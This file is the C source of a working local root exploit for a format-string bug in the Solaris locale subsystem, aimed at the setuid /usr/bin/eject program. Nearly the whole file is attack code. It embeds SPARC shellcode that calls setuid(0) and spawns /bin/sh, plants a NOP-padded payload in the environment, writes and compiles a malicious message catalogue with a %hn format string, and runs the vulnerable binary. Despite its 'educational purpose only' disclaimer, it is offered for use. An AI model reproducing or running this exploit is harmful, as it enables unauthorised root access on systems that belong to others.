/* "eject" exploit for locale subsystem format strings bug In Solaris
 * Tested in Solaris 2.6/7.0
 * Script kiddies: you should modify this code
 * slightly by yourself. :)
 *
 * Thanks for Ivan Arce <iarce@core-sdi.com>.
 *
 * THIS CODE IS FOR EDUCATIONAL PURPOSE ONLY AND SHOULD NOT BE RUN IN
 * ANY HOST WITHOUT PERMISSION FROM THE SYSTEM ADMINISTRATOR.
 *
 *           by warning3@nsfocus.com (http://www.nsfocus.com)
 *                                     y2k/9/8
 */
#include <stdio.h>
#include <sys/systeminfo.h>

#define RETLOC  0xffbefa2c  /* default retloc */
#define NUM     95          /* maybe should adjust this number */
#define ALIGN   0           /* If don't work ,try adjust align to 0,1,2,3 */

#define BUFSIZE 2048        /* the size of format string buffer*/
#define EGGSIZE 1024        /* the egg buffer size */
#define NOP     0xfa1d4015  /* "xor %l5, %l5, %l5" */
#define ALIGN1  2

#define VULPROG "/usr/bin/eject"

char shellcode[] = /* from scz's funny shellcode for SPARC */
"\x90\x08\x3f\xff\x82\x10\x20\x17\x91\xd0\x20\x08"   /* setuid(0)  */
"\xaa\x1d\x40\x15\x90\x05\x60\x01\x92\x10\x20\x09"   /* dup2(1,2)  */
"\x94\x05\x60\x02\x82\x10\x20\x3e\x91\xd0\x20\x08"
"\x20\x80\x49\x73\x20\x80\x62\x61\x20\x80\x73\x65\x20\x80\x3a\x29"
"\x7f\xff\xff\xff\x94\x1a\x80\x0a\x90\x03\xe0\x34\x92\x0b\x80\x0e"
"\x9c\x03\xa0\x08\xd0\x23\xbf\xf8\xc0\x23\xbf\xfc\xc0\x2a\x20\x07"
"\x82\x10\x20\x3b\x91\xd0\x20\x08\x90\x1b\xc0\x0f\x82\x10\x20\x01"
"\x91\xd0\x20\x08\x2f\x62\x69\x6e\x2f\x73\x68\xff";

/* get current stack point address to guess Return address */
long get_sp(void)

 {
        __asm__("mov %sp,%i0");
 }


main( int argc, char **argv )

 {

        char retlocbuf[256], *pattern,eggbuf[EGGSIZE],*env[3];
        char plat[256], *ptr;
        long sh_addr, sp_addr, retloc = RETLOC, i, num = NUM;
        long align=ALIGN, align1=ALIGN1;
        long  *addrptr;
        long reth, retl;
        FILE *fp;

        if( argc > 1 ) sscanf(argv[1],"%x",&retloc);
        if( argc > 2 ) align = atoi(argv[2]);
        if( argc > 3 ) num = atoi(argv[3]);


        addrptr = (long *) retlocbuf;
        retloc = (get_sp()&0xffff0000) + (retloc & 0x0000ffff);
        /* Let's make reloc buffer */

        for( i = 0 ; i < 2 ; i ++ ){
            *addrptr++ = 0x41414141;
            *addrptr++ = retloc;
            retloc += 2;
        }


        /* construct shellcode buffer */

        memset(eggbuf,'A',EGGSIZE);   /* fill the eggbuf with garbage */
        for (i = align; i < EGGSIZE; i+=4) /* fill with NOP */
        {
           eggbuf[i+3]=NOP & 0xff;
           eggbuf[i+2]=(NOP >> 8 ) &0xff;
           eggbuf[i+1]=(NOP >> 16 ) &0xff;
           eggbuf[i+0]=(NOP >> 24 ) &0xff;  /* Big endian */
         }
         /* Notice : we assume the length of shellcode can be divided exatcly by 4 .
            If not, exploit will fail. Anyway, our shellcode is. ;-)
          */
         memcpy(eggbuf + EGGSIZE - strlen(shellcode) - 4  + align, shellcode, strlen(shellcode));
         //memcpy(eggbuf,"EGG=",4);/* Now : EGG=NOP...NOPSHELLCODE */
         env[0] = "NLSPATH=:.";
         env[1] = eggbuf;    /* put eggbuf in env */
         env[2] = NULL;      /* end of env */

        /* get platform info  */
        sysinfo(SI_PLATFORM,plat,256);

        /* get stack bottom address */
        sp_addr = (get_sp() | 0xffff) & 0xfffffffc;
        /* get shellcode address . many thanks to Olaf Kirch. :)
         * the trailing '8' make sure our sh_addr into "NOP"s area.
         */
        sh_addr =  sp_addr - strlen(VULPROG) - strlen(plat)  - strlen(eggbuf) - 3 + 8 ;

        printf("Usages: %s <retloc> <align> <num> <bufsize> \n\n", argv[0] );
        printf("Using RETloc address = 0x%x, RET address = 0x%x  ,Align= %d\n", retloc, sh_addr, align );

        if((pattern = (char *)malloc(BUFSIZE)) == NULL) {
           printf("Can't get enough memory!\n");
           exit(-1);
        }

        ptr = pattern;
        for(i = 0 ; i < num ; i++ ){
           memcpy(ptr, "%.8x", 4);
           ptr += 4;
        }

        reth = (sh_addr >> 16) & 0xffff ;
        retl = (sh_addr >>  0) & 0xffff ;
        sprintf(ptr, "%%%uc%%hn%%%uc%%hn",(reth - num*8),
              (0x10000 +  retl - reth));

        printf("%s",pattern);

      if( !(fp = fopen("messages.po", "w+")))
      {
         perror("fopen");
         exit(1);
      }
   fprintf(fp,"domain \"messages\"\n");
   fprintf(fp,"msgid  \"usage: %%s [-fndq] [name | nickname]\\n\"\n");
   fprintf(fp,"msgstr \"%s\\n\"", pattern);
   fclose(fp);
   system("/usr/bin/msgfmt messages.po");
   system("cp messages.mo SUNW_OST_OSCMD");
   system("cp messages.mo SUNW_OST_OSLIB");

   execle(VULPROG,VULPROG,"-x",retlocbuf + align1, NULL, env);
}  /* end of main */
